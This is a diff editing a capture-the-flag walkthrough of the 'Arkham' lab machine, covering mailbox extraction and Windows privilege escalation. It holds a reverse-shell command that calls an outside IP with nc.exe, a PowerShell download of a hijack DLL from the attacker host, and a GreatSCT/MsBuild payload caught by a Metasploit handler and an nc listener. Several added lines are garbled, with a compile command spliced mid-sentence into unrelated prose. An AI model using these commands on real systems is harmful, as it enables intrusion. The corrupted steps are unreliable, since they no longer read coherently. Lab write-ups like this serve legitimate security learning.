@@ -183,7 +183,7 @@ Decode it:
 base64 -d backup.b64 > backup.zip
 ```
 
-After unzipping the file we find one interesting file in it called _alfred@arkham.local.ost_. This is an Exchange mailbox file, so we convert it into a .mbox file with this command:
+After unzipping the file we find one interesting file in it called _alfred[@]arkham.local.ost_. This is an Exchange mailbox file, so we convert it into a .mbox file with this command:
 ```markdown
 readpst alfred@arkham.local.ost
 ```
@@ -207,7 +207,9 @@ Invoke-Command -Computer ARKHAM -ScriptBlock { cmd /c nc.exe 10.10.13.112 9002 -
 
 ### Privilege Escalation to root
 
-Now we have a reverse shell wit batman, so let's check his groups and privileges:
+Now we have a reverse shell with DLL. I will call this main.c and put in into this repository. Compiling works like this:
+
+i686-w64-mingw32-g++ main.c -lws2_32 -o srrstr.dll -shared batman, so let's check his groups and privileges:
 ```markdown
 whoami /all
 ```
@@ -222,14 +224,16 @@ First we need to create a DLL. I will call this _main.c_ and put in into this re
 i686-w64-mingw32-g++ main.c -lws2_32 -o srrstr.dll -shared
 ```
 
-This created a DLL named _srrstr.dll_ and needs to get copied on the box in the path **C:\Users\Batman\appdata\local\microsoft\windowsapps**. Download the file with Batman:
+This creates DLL. I will call this main.c and put in into this repository. Compiling works like this:
+
+i686-w64-mingw32-g++ main.c -lws2_32 -o srrstr.dll -shared a DLL named _srrstr.dll_ and needs to get copied on the box in the path **C:\Users\Batman\appdata\local\microsoft\windowsapps**. Download the file with Batman:
 ```markdown
 iwr -uri hxxp://10.10.13.112/srrstr.dll -outfile srrstr.dll
 ```
 
 #### Escalating to interactive session process
 
-To escalate to an interactive sessuion process we use the tool **GreatSCT**. Installation can take some time.
+To escalate to an interactive session process we use the tool **GreatSCT**. Installation can take some time.
 GreatSCT is a simple to use framework, where you have a menu to choose what you want to do by typing the number of the menu you want to be in.
 
 We will first choose the one Tool it has (Bypass):
@@ -254,7 +258,11 @@ It displays where it stored the _payload.rc_ file to use it with Metasploit:
 msfconsole -r /usr/share/greatsct-output/handlers/payload.rc
 ```
 
-The _payload.xml_ needs to get uploaded on the box and can be placed in batmans home directory. We will use this payload with **MsBuild.exe**, but first you need to listen on port 9001:
+The _payload.xml_ needs to get uploaded on the box and can be placed in batmans home directory. We will use this payload with **MsBuild.exe**, but first we need to listen on port 9001:
+```markdown
+nc -lvnp 9001
+```
+
 ```markdown
 C:\Windows\microsoft.net\Framework\v4.0.30319\msbuild.exe payload.xml
 ```
